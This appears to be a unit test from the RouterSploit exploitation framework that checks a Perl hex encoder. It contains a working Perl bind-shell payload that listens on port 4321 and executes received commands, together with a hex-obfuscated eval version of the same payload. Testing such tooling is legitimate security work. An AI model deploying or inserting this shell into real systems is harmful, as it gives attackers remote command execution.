from routersploit.modules.encoders.perl.hex import Encoder


# perl bind tcp payload with rport=4321
bind_tcp = (
    "use IO;foreach my $key(keys %ENV){" +
    "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort," +
    "4321" +
    ",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){" +
    "if($_=~ /(.*)/){system $1;}};"
)

# perl bind tcp payload with rport=4321 encoded with perl/hex
bind_tcp_encoded = (
    "eval(pack('H*','75736520494f3b666f7265616368206d7920246b6579286b6579732025454e56297b69662824454e567b246b65797d3d7e2f282e2a292f297b24454e567b246b65797d3d24313b7d7d24633d6e657720494f3a3a536f636b65743a3a494e4554284c6f63616c506f72742c343332312c52657573652c312c4c697374656e292d3e6163636570743b247e2d3e66646f70656e2824632c77293b535444494e2d3e66646f70656e2824632c72293b7768696c65283c3e297b696628245f3d7e202f282e2a292f297b73797374656d2024313b7d7d3b'));"
)


def test_payload_encoding():
    """ Test scenario - payload encoding """

    encoder = Encoder()
    assert encoder.encode(bind_tcp) == bind_tcp_encoded
